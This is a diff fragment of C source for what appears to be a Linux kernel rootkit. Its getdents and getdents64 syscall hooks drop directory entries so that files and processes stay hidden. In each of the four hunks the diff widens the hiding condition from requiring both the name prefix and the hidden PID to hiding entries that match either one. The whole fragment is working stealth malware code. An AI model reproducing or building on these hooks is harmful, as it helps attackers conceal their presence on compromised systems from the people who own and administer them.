@@ -158,7 +158,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
         current_dir = (void *)dirent_ker + offset;
 
         /* Compare current_dir->d_name to PREFIX */
-        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0  && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0  || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
         {
             /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
             if ( current_dir == dirent_ker )
@@ -244,7 +244,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
         current_dir = (void *)dirent_ker + offset;
 
         /* Compare current_dir->d_name to PREFIX */
-        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
         {
             /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
             if ( current_dir == dirent_ker )
@@ -346,7 +346,7 @@ static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *di
         current_dir = (void *)dirent_ker + offset;
 
         /* Compare current_dir->d_name to PREFIX */
-        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
         {
             /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
             if ( current_dir == dirent_ker )
@@ -423,7 +423,7 @@ static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent
         current_dir = (void *)dirent_ker + offset;
 
         /* Compare current_dir->d_name to PREFIX */
-        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
+        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
         {
             /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
             if ( current_dir == dirent_ker )
